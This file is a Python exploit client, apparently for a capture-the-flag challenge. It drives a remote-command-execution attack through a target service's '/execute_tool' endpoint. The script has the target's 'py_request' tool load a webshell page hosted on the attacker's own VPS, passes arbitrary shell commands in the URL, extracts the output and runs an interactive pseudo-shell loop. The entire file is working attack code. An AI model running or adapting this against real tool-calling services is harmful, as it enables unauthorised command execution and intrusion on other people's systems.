import requests
import json
import base64
import sys

# 该脚本用于配合 webshell_template.html 实现交互式 Shell
# 1. 请将 webshell_template.html 上传到您的 VPS，例如 http://vps/shell.html
# 2. 运行: python shell_client.py http://vps/shell.html

# 目标 URL
TARGET_URL = "http://cloud-middle.hgame.vidar.club:30411/execute_tool"

def execute_cmd(exploit_base_url, cmd):
    # 拼接命令到 URL 参数中
    # 注意：这里需要确保 payload url 被正确编码
    import urllib.parse
    import ast
    
    final_exploit_url = f"{exploit_base_url}?c={urllib.parse.quote(cmd)}"
    
    payload = {
        "name": "py_request",
        "arguments": {
            "url": final_exploit_url
        }
    }
    
    try:
        resp = requests.post(TARGET_URL, json=payload, headers={"Content-Type": "application/json"})
        if resp.status_code == 200:
            res_json = resp.json()
            if res_json.get("code") == 1:
                # 解析嵌套结果
                raw_inner = res_json.get("result", "")
                
                try:
                    inner_json = json.loads(raw_inner)
                    page_content = inner_json.get("content", "")
                except json.JSONDecodeError:
                    return f"[-] Failed to decode inner JSON: {raw_inner}"
                
                if "|||RESULT_START|||" in page_content:
                    start = page_content.find("|||RESULT_START|||") + len("|||RESULT_START|||")
                    end = page_content.find("|||RESULT_END|||")
                    result_str = page_content[start:end]
                    
                    # 尝试解析 Python 字典字符串
                    try:
                        # 结果通常是 {'subprocess': ..., 'output': '...'}
                        # 我们想提取 'output' 或 'res'
                        res_dict = ast.literal_eval(result_str)
                        if isinstance(res_dict, dict):
                            if 'output' in res_dict:
                                return res_dict['output']
                            if 'res' in res_dict:
                                return res_dict['res']
                            # 如果没找到特定键，返回整个字典（除了模块对象太长可能不想看，但作为fallback）
                            return str(res_dict)
                    except:
                        pass
                    
                    return result_str
                else:
                    return f"[-] No result marker found. Preview:\n{page_content[:200]}"
            else:
                return f"[-] API Error: {res_json}"
        else:
            return f"[-] HTTP Error: {resp.status_code}"
    except Exception as e:
        return f"[-] Exception: {e}"

def main():
    if len(sys.argv) < 2:
        print("Usage: python shell_client.py <YOUR_VPS_SHELL_HTML_URL>")
        return
        
    exploit_url = sys.argv[1].split('?')[0] # remove params if any
    
    if not exploit_url.startswith("http"):
        exploit_url = "https://" + exploit_url
        print(f"[*] Auto-prefixed URL to: {exploit_url}")
    
    print(f"[*] using exploit page: {exploit_url}")
    print("[*] Interactive Shell (pseudo). Type 'exit' to quit.")
    
    while True:
        cmd = input("Shell> ")
        if cmd.lower() in ['exit', 'quit']:
            break
        if not cmd.strip(): continue
        
        output = execute_cmd(exploit_url, cmd)
        print(output)

if __name__ == "__main__":
    main()
